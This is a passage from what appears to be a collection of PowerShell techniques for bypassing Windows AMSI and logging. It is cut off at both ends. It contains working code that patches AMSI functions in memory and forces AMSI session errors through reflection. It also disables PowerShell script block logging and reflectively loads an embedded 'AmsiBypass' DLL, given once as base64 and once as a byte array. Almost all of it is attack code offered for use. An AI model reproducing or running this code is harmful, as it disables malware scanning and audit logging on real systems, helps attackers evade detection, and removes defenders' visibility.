esp,18h 0x53, # push ebx 0x56 # push esi ) } [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg) Write-Host \"[+] Targeted address: $targetedAddress\" $oldProtectionBuffer = 0 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null $patch = [byte[]] ( 0x31, 0xC0, # xor rax, rax 0xC3 # ret ) [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3) $a = 0 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null Forcing an error $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem) Disable Script Logging $settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null); $settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"] = @{} $settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\", \"0\") [Ref].Assembly.GetType(\"System.Management.Automation.ScriptBlock\").GetField(\"signatures\",\"NonPublic,static\").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]')) Amsi Buffer Patch - In memory function Bypass-AMSI { if(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) { [Reflection.Assembly]::Load([Convert]::FromBase64String(\"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YXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAAbwBpAG4AdABlAHIALgAAHUEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAAc0UAUgBSAE8AUgA6ACAAQwBvAHUAbABkACAAbgBvAHQAIAByAGUAdAByAGkAZQB2AGUAIABBAG0AcwBpAFMAYwBhAG4AQgB1AGYAZgBlAHIAIABmAHUAbgBjAHQAaQBvAG4AIABwAG8AaQBuAHQAZQByAAB1RQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAGMAaABhAG4AZwBlACAAQQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIQAAU0cAcgBlAGEAdAAgAHMAdQBjAGMAZQBzAHMALgAgAEEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAgAHAAYQB0AGMAaABlAGQAIQAgADoAKQAAALj1zdc1kW1DrpRSfqgqDIUABCABAQgDIAABBSABARERBCABAQ4NBwoYGBkJHQUYAggCAgIGGAUAAgIYGAQAAQEOBAABGQsHAAIBElERVQQAARgICAAEAR0FCBgIBQACGBgICMx7E//NLd1RAwYREAUAAhgYDgQAARgOCAAEAhgZCRAJBgADARgYCAMAAAgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAANgEAGS5ORVRTdGFuZGFyZCxWZXJzaW9uPXYyLjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lAA8BAApBbXNpQnlwYXNzAAAKAQAFRGVidWcAAAwBAAcxLjAuMC4wAAAKAQAFMS4wLjAAAAQBAAAAAAAAAAAAOsRk5QABTVACAAAAZAAAAHwrAAB8DQAAAAAAAAAAAAABAAAAEwAAACcAAADgKwAA4A0AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTjA86n5+khUmILRfMmrpC/wEAAAAvb3B0L1Byb2plY3RzL0Ftc2lCeXBhc3MvQW1zaUJ5cGFzcy9vYmovRGVidWcvbmV0c3RhbmRhcmQyLjAvQW1zaUJ5cGFzcy5wZGIAU0hBMjU2AIwPOp+fpIWJyC0XzJq6Qv86xGTlbSfIKidw8ohPKRL4LywAAAAAAAAAAAAASSwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAADssAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAAD/JQAgABAxgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAADUAgAAAAAAAAAAAADUAjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAENAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAEAIAAAEAMAAwADAAMAAwADQAYgAwAAAANgALAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABBAG0AcwBpAEIAeQBwAGEAcwBzAAAAAAA+AAsAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAPgAPAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABBAG0AcwBpAEIAeQBwAGEAcwBzAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbQBzAGkAQgB5AHAAYQBzAHMAAAAAADAABgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAFw| Out-Null Write-Output \"DLL has been reflected\"; } [Bypass.AMSI]::Patch() } Same as 6 but integer Bytes instead of Base64 function MyPatch{ if(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) { [Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 